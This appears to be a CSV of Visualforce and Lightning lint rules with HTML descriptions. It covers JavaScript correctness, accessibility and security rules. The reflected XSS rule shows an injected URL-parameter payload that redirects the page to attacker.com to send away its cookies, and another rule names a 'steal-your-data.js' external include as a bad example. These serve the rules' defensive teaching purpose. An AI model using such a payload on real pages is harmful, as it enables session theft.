VISUALFORCE and AURA LIGHTNING RULES,,,,,,
rules_key,rules_name,rules_mdDesc,rules_severity,rules_langName,rules_type,nCino Specific
cs-vf:no-undef,disallow the use of undeclared variables unless mentioned in `/*global */` comments,"<p>This rule can help you locate potential ReferenceErrors resulting from misspellings of variable and parameter names, or accidental implicit globals (for example, from forgetting the <code>var</code> keyword in a <code>for</code> loop initializer).</p>
<h2 id=""ruledetails"">Rule Details</h2>
<p>Any reference to an undeclared variable causes a warning, unless the variable is explicitly mentioned in a <code>/*global ...*/</code> comment, or specified in the <a href=""https://eslint.org/docs/user-guide/configuring#specifying-globals""><code>globals</code> key in the configuration file</a>. A common use case for these is if you intentionally use globals that are defined elsewhere (e.g. in a script sourced from HTML).</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-undef: ""error""*/

var a = someFunction();
b = 10;
</code></pre>
<p>Examples of <strong>correct</strong> code for this rule with <code>global</code> declaration:</p>
<pre><code class=""js language-js"">/*global someFunction b:true*/
/*eslint no-undef: ""error""*/

var a = someFunction();
b = 10;
</code></pre>
<p>The <code>b:true</code> syntax in <code>/*global */</code> indicates that assignment to <code>b</code> is correct.</p>
<p>Examples of <strong>incorrect</strong> code for this rule with <code>global</code> declaration:</p>
<pre><code class=""js language-js"">/*global b*/
/*eslint no-undef: ""error""*/

b = 10;
</code></pre>
<p>By default, variables declared in <code>/*global */</code> are read-only, therefore assignment is incorrect.</p>
<h2 id=""options"">Options</h2>
<ul>
<li><code>typeof</code> set to true will warn for variables used inside typeof check (Default false).</li>
</ul>
<h3 id=""typeof"">typeof</h3>
<p>Examples of <strong>correct</strong> code for the default <code>{ ""typeof"": false }</code> option:</p>
<pre><code class=""js language-js"">/*eslint no-undef: ""error""*/

if (typeof UndefinedIdentifier === ""undefined"") {
    // do something ...
}
</code></pre>
<p>You can use this option if you want to prevent <code>typeof</code> check on a variable which has not been declared.</p>
<p>Examples of <strong>incorrect</strong> code for the <code>{ ""typeof"": true }</code> option:</p>
<pre><code class=""js language-js"">/*eslint no-undef: [""error"", { ""typeof"": true }] */

if(typeof a === ""string""){}
</code></pre>
<p>Examples of <strong>correct</strong> code for the <code>{ ""typeof"": true }</code> option with <code>global</code> declaration:</p>
<pre><code class=""js language-js"">/*global a*/
/*eslint no-undef: [""error"", { ""typeof"": true }] */

if(typeof a === ""string""){}
</code></pre>
<h2 id=""environments"">Environments</h2>
<p>For convenience, ESLint provides shortcuts that pre-define global variables exposed by popular libraries and runtime environments. This rule supports these environments, as listed in <a href=""../user-guide/configuring.md#specifying-environments"">Specifying Environments</a>.  A few examples are given below.</p>
<h3 id=""browser"">browser</h3>
<p>Examples of <strong>correct</strong> code for this rule with <code>browser</code> environment:</p>
<pre><code class=""js language-js"">/*eslint no-undef: ""error""*/
/*eslint-env browser*/

setTimeout(function() {
    alert(""Hello"");
});
</code></pre>
<h3 id=""nodejs"">Node.js</h3>
<p>Examples of <strong>correct</strong> code for this rule with <code>node</code> environment:</p>
<pre><code class=""js language-js"">/*eslint no-undef: ""error""*/
/*eslint-env node*/

var fs = require(""fs"");
module.exports = function() {
    console.log(fs);
};
</code></pre>
<h2 id=""whennottouseit"">When Not To Use It</h2>
<p>If explicit declaration of global variables is not to your taste.</p>
<h2 id=""compatibility"">Compatibility</h2>
<p>This rule provides compatibility with treatment of global variables in <a href=""http://jshint.com/"">JSHint</a> and <a href=""http://www.jslint.com"">JSLint</a>.</p>",MAJOR,Visual Force & Lightning,BUG,FALSE
cs-vf:no-shadow-restricted-names,disallow identifiers from shadowing restricted names,"<p>ES5 Â§15.1.1 Value Properties of the Global Object (<code>NaN</code>, <code>Infinity</code>, <code>undefined</code>) as well as strict mode restricted identifiers <code>eval</code> and <code>arguments</code> are considered to be restricted names in JavaScript. Defining them to mean something else can have unintended consequences and confuse others reading the code. For example, there's nothing prevent you from writing:</p>
<pre><code class=""js language-js"">var undefined = ""foo"";
</code></pre>
<p>Then any code used within the same scope would not get the global <code>undefined</code>, but rather the local version with a very different meaning.</p>
<h2 id=""ruledetails"">Rule Details</h2>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-shadow-restricted-names: ""error""*/

function NaN(){}

!function(Infinity){};

var undefined;

try {} catch(eval){}
</code></pre>
<p>Examples of <strong>correct</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-shadow-restricted-names: ""error""*/

var Object;

function f(a, b){}
</code></pre>
<h2 id=""furtherreading"">Further Reading</h2>
<ul>
<li><a href=""https://es5.github.io/#x15.1.1"">Annotated ES5 - Â§15.1.1</a></li>
<li><a href=""https://es5.github.io/#C"">Annotated ES5 - Annex C</a></li>
</ul>",CRITICAL,Visual Force & Lightning,BUG,FALSE
cs-vf:no-label-var,disallow labels that share a name with a variable,"<h2 id=""ruledetails"">Rule Details</h2>
<p>This rule aims to create clearer code by disallowing the bad practice of creating a label that shares a name with a variable that is in scope.</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-label-var: ""error""*/

var x = foo;
function bar() {
x:
  for (;;) {
    break x;
  }
}
</code></pre>
<p>Examples of <strong>correct</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-label-var: ""error""*/

// The variable that has the same name as the label is not in scope.

function foo() {
  var q = t;
}

function bar() {
q:
  for(;;) {
    break q;
  }
}
</code></pre>
<h2 id=""whennottouseit"">When Not To Use It</h2>
<p>If you don't want to be notified about usage of labels, then it's safe to disable this rule.</p>",MINOR,Visual Force & Lightning,BUG,FALSE
cs-vf:no-invalid-regexp,disallow invalid regular expression strings in `RegExp` constructors,"<p>An invalid pattern in a regular expression literal is a <code>SyntaxError</code> when the code is parsed, but an invalid string in <code>RegExp</code> constructors throws a <code>SyntaxError</code> only when the code is executed.</p>
<h2 id=""ruledetails"">Rule Details</h2>
<p>This rule disallows invalid regular expression strings in <code>RegExp</code> constructors.</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-invalid-regexp: ""error""*/

RegExp('[')

RegExp('.', 'z')

new RegExp('\\')
</code></pre>
<p>Examples of <strong>correct</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-invalid-regexp: ""error""*/

RegExp('.')

new RegExp

this.RegExp('[')
</code></pre>
<h2 id=""environments"">Environments</h2>
<p>ECMAScript 6 adds the following flag arguments to the <code>RegExp</code> constructor:</p>
<ul>
<li><code>""u""</code> (<a href=""https://people.mozilla.org/~jorendorff/es6-draft.html#sec-get-regexp.prototype.unicode"">unicode</a>)</li>
<li><code>""y""</code> (<a href=""https://people.mozilla.org/~jorendorff/es6-draft.html#sec-get-regexp.prototype.sticky"">sticky</a>)</li>
</ul>
<p>You can enable these to be recognized as valid by setting the ECMAScript version to 6 in your <a href=""../user-guide/configuring"">ESLint configuration</a>.</p>
<p>If you want to allow additional constructor flags for any reason, you can specify them using an <code>allowConstructorFlags</code> option in <code>.eslintrc</code>. These flags will then be ignored by the rule regardless of the <code>ecmaVersion</code> setting.</p>
<h2 id=""options"">Options</h2>
<p>This rule has an object option for exceptions:</p>
<ul>
<li><code>""allowConstructorFlags""</code> is an array of flags</li>
</ul>
<h3 id=""allowconstructorflags"">allowConstructorFlags</h3>
<p>Examples of <strong>correct</strong> code for this rule with the <code>{ ""allowConstructorFlags"": [""u"", ""y""] }</code> option:</p>
<pre><code class=""js language-js"">/*eslint no-invalid-regexp: [""error"", { ""allowConstructorFlags"": [""u"", ""y""] }]*/

new RegExp('.', 'y')

new RegExp('.', 'yu')
</code></pre>
<p>A list of valid flags for regular expressions is available <a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp"">here</a>.</p>
<h2 id=""furtherreading"">Further Reading</h2>
<ul>
<li><a href=""https://es5.github.io/#x7.8.5"">Annotated ES5 Â§7.8.5 - Regular Expression Literals</a></li>
</ul>",MINOR,Visual Force & Lightning,BUG,FALSE
cs-vf:no-global-assign,disallow assignment to native objects,"<h1 id=""disallowassignmenttonativeobjectsorreadonlyglobalvariablesnoglobalassign"">Disallow assignment to native objects or read-only global variables (no-global-assign)</h1>
<p>JavaScript environments contain a number of built-in global variables, such as <code>window</code> in browsers and <code>process</code> in Node.js. In almost all cases, you don't want to assign a value to these global variables as doing so could result in losing access to important functionality. For example, you probably don't want to do this in browser code:</p>
<pre><code class=""js language-js"">window = {};
</code></pre>
<p>While examples such as <code>window</code> are obvious, there are often hundreds of built-in global objects provided by JavaScript environments. It can be hard to know if you're assigning to a global variable or not.</p>
<h2 id=""ruledetails"">Rule Details</h2>
<p>This rule disallows modifications to read-only global variables.</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/

Object = null
undefined = 1
</code></pre>
<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
/*eslint-env browser*/

window = {}
length = 1
top = 1
</code></pre>
<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
/*globals a:false*/

a = 1
</code></pre>
<p>Examples of <strong>correct</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/

a = 1
var b = 1
b = 2
</code></pre>
<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
/*eslint-env browser*/

onload = function() {}
</code></pre>
<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
/*globals a:true*/

a = 1
</code></pre>
<h2 id=""options"">Options</h2>
<p>This rule accepts an <code>exceptions</code> option, which can be used to specify a list of builtins for which reassignments will be allowed:</p>
<pre><code class=""json language-json"">{
    ""rules"": {
        ""no-global-assign"": [""error"", {""exceptions"": [""Object""]}]
    }
}
</code></pre>
<h2 id=""whennottouseit"">When Not To Use It</h2>
<p>If you are trying to override one of the native objects.</p>",MAJOR,Visual Force & Lightning,BUG,FALSE
vf:MouseEventWithoutKeyboardEquivalentCheck,Mouse Events should have Equivalent Keyboard Events,"Offering the same experience with the mouse and the keyboard allow users to pick their preferred device.
Additionally, users of assistive technology will also be able to browse the site even if they cannot use the mouse.
    

<p>The following code:</p>

<pre>
&lt;a onClick=""doSomething();"" ...&gt;                                //Bad: 'onKeyPress' is missing.
&lt;a onMouseover=""doSomething();"" ...&gt;                            //Bad: 'onFocus' is missing.
&lt;a onMouseout=""doSomething();"" ...&gt;                             //Bad: 'onBlur' is missing.
</pre>

<p>should be refactored into:</p>

<pre>
&lt;a onClick=""doSomething();"" onKeyPress=""doSomething();"" ...&gt;    //Good: preferred approach.
&lt;a onMouseover=""doSomething();"" onFocus=""doSomething();"" ...&gt;   //Good: preferred approach.
&lt;a onMouseout=""doSomething();"" onBlur=""doSomething();"" ...&gt;     //Good: preferred approach.
</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
cs-vf:no-extra-boolean-cast,disallow unnecessary boolean casts,"<p>In contexts such as an <code>if</code> statement's test where the result of the expression will already be coerced to a Boolean, casting to a Boolean via double negation (<code>!!</code>) or a <code>Boolean</code> call is unnecessary. For example, these <code>if</code> statements are equivalent:</p>
<pre><code class=""js language-js"">if (!!foo) {
    // ...
}

if (Boolean(foo)) {
    // ...
}

if (foo) {
    // ...
}
</code></pre>
<h2 id=""ruledetails"">Rule Details</h2>
<p>This rule disallows unnecessary boolean casts.</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-extra-boolean-cast: ""error""*/

var foo = !!!bar;

var foo = !!bar ? baz : bat;

var foo = Boolean(!!bar);

var foo = new Boolean(!!bar);

if (!!foo) {
    // ...
}

if (Boolean(foo)) {
    // ...
}

while (!!foo) {
    // ...
}

do {
    // ...
} while (Boolean(foo));

for (; !!foo; ) {
    // ...
}
</code></pre>
<p>Examples of <strong>correct</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-extra-boolean-cast: ""error""*/

var foo = !!bar;
var foo = Boolean(bar);

function foo() {
    return !!bar;
}

var foo = bar ? !!baz : !!bat;
</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
cs-vf:no-obj-calls,disallow calling global object properties as functions,"<p>ECMAScript provides several global objects that are intended to be used as-is. Some of these objects look as if they could be constructors due their capitalization (such as <code>Math</code> and <code>JSON</code>) but will throw an error if you try to execute them as functions.</p>
<p>The <a href=""https://es5.github.io/#x15.8"">ECMAScript 5 specification</a> makes it clear that both <code>Math</code> and <code>JSON</code> cannot be invoked:</p>
<blockquote>
  <p>The Math object does not have a <code>[[Call]]</code> internal property; it is not possible to invoke the Math object as a function.</p>
</blockquote>
<p>And the <a href=""https://www.ecma-international.org/ecma-262/6.0/index.html#sec-reflect-object"">ECMAScript 2015 specification</a> makes it clear that <code>Reflect</code> cannot be invoked:</p>
<blockquote>
  <p>The Reflect object also does not have a <code>[[Call]]</code> internal method; it is not possible to invoke the Reflect object as a function.</p>
</blockquote>
<h2 id=""ruledetails"">Rule Details</h2>
<p>This rule disallows calling the <code>Math</code>, <code>JSON</code> and <code>Reflect</code> objects as functions.</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-obj-calls: ""error""*/

var math = Math();
var json = JSON();
var reflect = Reflect();
</code></pre>
<p>Examples of <strong>correct</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-obj-calls: ""error""*/

function area(r) {
    return Math.PI * r * r;
}
var object = JSON.parse(""{}"");
var value = Reflect.get({ x: 1, y: 2 }, ""x"");
</code></pre>
<h2 id=""furtherreading"">Further Reading</h2>
<ul>
<li><a href=""https://es5.github.io/#x15.8"">The Math Object</a></li>
</ul>",MINOR,Visual Force & Lightning,BUG,FALSE
cs-vf:no-unreachable,"disallow unreachable code after `return`, `throw`, `continue`, and `break` statements","<p>Because the <code>return</code>, <code>throw</code>, <code>break</code>, and <code>continue</code> statements unconditionally exit a block of code, any statements after them cannot be executed. Unreachable statements are usually a mistake.</p>
<pre><code class=""js language-js"">function fn() {
    x = 1;
    return x;
    x = 3; // this will never execute
}
</code></pre>
<h2 id=""ruledetails"">Rule Details</h2>
<p>This rule disallows unreachable code after <code>return</code>, <code>throw</code>, <code>continue</code>, and <code>break</code> statements.</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-unreachable: ""error""*/

function foo() {
    return true;
    console.log(""done"");
}

function bar() {
    throw new Error(""Oops!"");
    console.log(""done"");
}

while(value) {
    break;
    console.log(""done"");
}

throw new Error(""Oops!"");
console.log(""done"");

function baz() {
    if (Math.random() &lt; 0.5) {
        return;
    } else {
        throw new Error();
    }
    console.log(""done"");
}

for (;;) {}
console.log(""done"");
</code></pre>
<p>Examples of <strong>correct</strong> code for this rule, because of JavaScript function and variable hoisting:</p>
<pre><code class=""js language-js"">/*eslint no-unreachable: ""error""*/

function foo() {
    return bar();
    function bar() {
        return 1;
    }
}

function bar() {
    return x;
    var x;
}

switch (foo) {
    case 1:
        break;
        var x;
}
</code></pre>",MAJOR,Visual Force & Lightning,BUG,FALSE
vf:HotspotGetSessionIdUsage,Using GETSESSIONID() and $API.Session_Id is security-sensitive,"The use of GETSESSIONID() and $API.Session_Id is security-sensitive. Ensure that you need to do this.

<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/807"">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> OWASP Top 10 2021 Category A7 - Identification and Authentication Failures  </li>
</ul>",MAJOR,Visual Force & Lightning,SECURITY_HOTSPOT,FALSE
vf:CrossSiteScriptingReflected,JavaScript Reflected XSS,"Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response.<br/>
    	<br/>
    	<h2>See</h2>
    	<ul>
    	  <li> <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_security_tips_xss.htm"">Cross Site Scripting (XSS)</a></li>
		  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
		  ('Eval Injection') </li>
		  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
		  ('Unsafe Reflection') </li>
		  <li> OWASP Top 10 2021 Category A03 - Injection </li>
		  
		</ul>

    <BR><h2>Example:</h2><pre>

<script>var foo = '{!$CurrentPage.parameters.userparam}';</script>    //Bad: Javascript does not have built in protections.
                                                                      
// If userparam was given the value ""1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2""
// all of the cookies for the current page would be sent to www.attacker.com.
                                                                      


    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
vf:UnencodedStyle,Unencoded Formulas In Style Tags XSS,"Makes sure that all values obtained from URL parameters are properly escaped / sanitized to avoid XSS attacks.<br/>
Input can be sanitized with JSENCODE().<br/>
<br/>
Using unescaped parameters can be a security risk.
<h2>See</h2>
<ul>
  <li> <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_security_tips_scontrols.htm"">Unescaped Output and Formulas in Visualforce Pages</a></li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2021 Category A03 - Injection </li>
  
</ul>


      <BR><h2>Example:</h2><pre>

&lt;style&gt;
	  .xyz {
	    color: #{!$CurrentPage.parameters.userInput}; //Bad: This is vulnerable to XSS.
	  }
&lt;/style&gt;

&lt;style&gt;
	  .xyz {
	    color: #{!JSENCODE($CurrentPage.parameters.userInput)}; //Good: This is encoded with JSENCODE.
	  }
&lt;/style&gt;

    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
vf:AvoidExternalResources,External Script and Style Resources Should Be Avoided,"Including content from untrusted sources can lead to various security issues including include injection of malware,
		information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware.<BR/>
		<BR/>
		All script and style resources must be loaded via static resources.<BR/>
		Do not load these resources via script tags or links. <BR/>

<h2>See</h2>		
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/829"">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li>
  <li> OWASP Top 10 2021 Category A3 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>
    <BR><h2>Example:</h2><pre>
	
&lt;aura:component&gt;

  &lt;ltng:require 
    styles=""https://blah.com/css""    //Bad: This is not recommended.
    scripts=""{!$Resource.example_js}""  //Good: Uses a static resource.
    afterScriptsLoaded=""{!c.scriptsLoaded}"" /&gt;
    
&lt;/aura:component&gt;

&lt;apex:page&gt;

  &lt;apex:includeScript value=""http://risky.com/steal-your-data.js""/&gt; //Bad: This is not recommended.
  &lt;apex:stylesheet value=""http://good.good.styles.com/css"" /&gt;  //Bad: This is not recommended.

  &lt;apex:includeScript value=""{!$Resource.example_js}""/&gt;    //Good: Uses a static resource.
  &lt;apex:stylesheet value=""{!$Resource.customCSS}"" /&gt;      //Good: Uses a static resource.
  
&lt;/apex:page&gt;





    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
cs-vf:secure-document,validate document global access,"<p>This rule makes sure that only supported properties and functions are used to access the document global.</p>
<h2 id=""ruledetails"">Rule Details</h2>
<p>When the rule is enabled, unsupported calls or API objects are disallowed.  Your Lightning components are permitted to use:</p>
<ul>
<li>Standard Lightning Component Framework features.</li>
<li>Standard Javascript features.</li>
<li>Standard Locker Service SecureObject object features. </li>
</ul>
<p>All disallowed uses are shown in red on this <a href=""http://documentation.auraframework.org/lockerApiTest/index.app?aura.mode=DEV"">Document vs SecureDocument Compatibility Table</a>.</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">var curScriptElement = document.currentScript; //Using document.currentScript is disallowed.
</code></pre>",BLOCKER,Visual Force & Lightning,CODE_SMELL,FALSE
cs-vf:no-extend-native,disallow extending native types,"<p>In JavaScript, you can extend any object, including builtin or ""native"" objects. Sometimes people change the behavior of these native objects in ways that break the assumptions made about them in other parts of the code.</p>
<p>For example here we are overriding a builtin method that will then affect all Objects, even other builtins.</p>
<pre><code class=""js language-js"">// seems harmless
Object.prototype.extra = 55;

// loop through some userIds
var users = {
    ""123"": ""Stan"",
    ""456"": ""David""
};

// not what you'd expect
for (var id in users) {
    console.log(id); // ""123"", ""456"", ""extra""
}
</code></pre>
<p>A common suggestion to avoid this problem would be to wrap the inside of the <code>for</code> loop with <code>users.hasOwnProperty(id)</code>. However, if this rule is strictly enforced throughout your codebase you won't need to take that step.</p>
<h2 id=""ruledetails"">Rule Details</h2>
<p>Disallows directly modifying the prototype of builtin objects.</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-extend-native: ""error""*/

Object.prototype.a = ""a"";
Object.defineProperty(Array.prototype, ""times"", { value: 999 });
</code></pre>
<h2 id=""options"">Options</h2>
<p>This rule accepts an <code>exceptions</code> option, which can be used to specify a list of builtins for which extensions will be allowed.</p>
<h3 id=""exceptions"">exceptions</h3>
<p>Examples of <strong>correct</strong> code for the sample <code>{ ""exceptions"": [""Object""] }</code> option:</p>
<pre><code class=""js language-js"">/*eslint no-extend-native: [""error"", { ""exceptions"": [""Object""] }]*/

Object.prototype.a = ""a"";
</code></pre>
<h2 id=""knownlimitations"">Known Limitations</h2>
<p>This rule <em>does not</em> report any of the following less obvious approaches to modify the prototype of builtin objects:</p>
<pre><code class=""js language-js"">var x = Object;
x.prototype.thing = a;

eval(""Array.prototype.forEach = 'muhahaha'"");

with(Array) {
    prototype.thing = 'thing';
};

window.Function.prototype.bind = 'tight';
</code></pre>
<h2 id=""whennottouseit"">When Not To Use It</h2>
<p>You may want to disable this rule when working with polyfills that try to patch older versions of JavaScript with the latest spec, such as those that might <code>Function.prototype.bind</code> or <code>Array.prototype.forEach</code> in a future-friendly way.</p>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
cs-vf:no-catch-shadow,disallow `catch` clause parameters from shadowing variables in the outer scope,"<p>In IE 8 and earlier, the catch clause parameter can overwrite the value of a variable in the outer scope, if that variable has the same name as the catch clause parameter.</p>
<pre><code class=""js language-js"">var err = ""x"";

try {
    throw ""problem"";
} catch (err) {

}

console.log(err)    // err is 'problem', not 'x'
</code></pre>
<h2 id=""ruledetails"">Rule Details</h2>
<p>This rule is aimed at preventing unexpected behavior in your program that may arise from a bug in IE 8 and earlier, in which the catch clause parameter can leak into outer scopes. This rule will warn whenever it encounters a catch clause parameter that has the same name as a variable in an outer scope.</p>
<p>Examples of <strong>incorrect</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-catch-shadow: ""error""*/

var err = ""x"";

try {
    throw ""problem"";
} catch (err) {

}

function err() {
    // ...
};

try {
    throw ""problem"";
} catch (err) {

}
</code></pre>
<p>Examples of <strong>correct</strong> code for this rule:</p>
<pre><code class=""js language-js"">/*eslint no-catch-shadow: ""error""*/

var err = ""x"";

try {
    throw ""problem"";
} catch (e) {

}

function err() {
    // ...
};

try {
    throw ""problem"";
} catch (e) {

}
</code></pre>
<h2 id=""whennottouseit"">When Not To Use It</h2>
<p>If you do not need to support IE 8 and earlier, you should turn this rule off.</p>",MAJOR,Visual Force & Lightning,BUG,FALSE
vf:BoldTagsCheck,"""strong"" Tags Should Be Used Instead of ""b""","<p>
The &lt;strong&gt;/&lt;b&gt; tags have exactly the same effect in most web browsers, but there is a fundamental difference between them: &lt;strong&gt; has a semantic meaning whereas &lt;b&gt; only conveys styling information like CSS.
</p>
<p>
When &lt;b&gt; can have simply no effect on a Palm device with limited display or when a screen reader software is used by a blind person, &lt;strong&gt; will:
</p>

<ul>
  <li>Underline the characters on a Palm Pilot</li>
  <li>Speak with lower tone when using a screen reader such as Jaws</li>
  <li>And display the text bold in normal browsers</li>
</ul>

<p>Consequently:</p>

<ul>
  <li>in order to convey semantics, the &lt;b&gt; tags shall never be used,</li>
  <li>in order to convey styling information, the &lt;b&gt; should be avoided and CSS should be used instead.</li>
</ul>

     

<h2>Noncompliant Code Example</h2>

<pre>
&lt;i&gt;car&lt;/i&gt;                 //Bad: this is not recommended.
&lt;b&gt;train&lt;/b&gt;               //Bad: this is not recommended.
</pre>

<h2>Compliant Solution</h2>

<pre>
&lt;em&gt;car&lt;/em&gt;               //Good: this is preferred.
&lt;strong&gt;train&lt;/strong&gt;     //Good: this is preferred.
</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
vf:InlineStyleAttributesCheck,Avoid Inline CSS Style Attributes,"<p>
This rule detects the usage of HTML ""style"" attributes to make sure that all CSS styles are defined in CSS classes.
</p>

     <BR><h2>Example:</h2><pre>

 &lt;p style=""color: blue;"" &gt; //Bad: using inline style attributes is not recommended.

 	//content...

 &lt;/p&gt;


     </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
vf:LightningEnhancedListCheck,Check for Lightning Migration Issues for apex:enhancedList,"This rule looks for apex:enhancedList usage which may no longer work in lightning.
apex:enhancedList isn't supported in Lightning Experience.
We recommend avoiding <apex:enhancedList> in Lightning Experience.

See <a href=""https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf"">https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf</a>
    <BR><h2>Example:</h2><pre>


&lt;apex:page&gt;
	&lt;apex:enhancedList&gt;&lt;/apex:enhancedList&gt; //Bad: not recommended.
&lt;/apex:page&gt;




    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
vf:RequireConfirmationToken,Require CSRF Protection On GET Requests,"Require CSRF protection on GET requests must be enabled from the Visual Force Page settings.<br/>
<br/>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29"">OWASP: Cross-Site Request Forgery</a> </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#SPRING_CSRF_PROTECTION_DISABLED"">SPRING_CSRF_PROTECTION_DISABLED</a> </li>
  <li> <a href=""https://trailhead.salesforce.com/en/content/learn/modules/secdev_application_logic_vulnerabilities/secdev_app_logic_csrf"">Salesforce Trailhead: Prevent Cross-Site Request Forgery (CSRF)</a> </li>
</ul>
  <BR><h2>Example:</h2><pre>//This setting must be enabled while creating a Visualforce page in Setup. </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
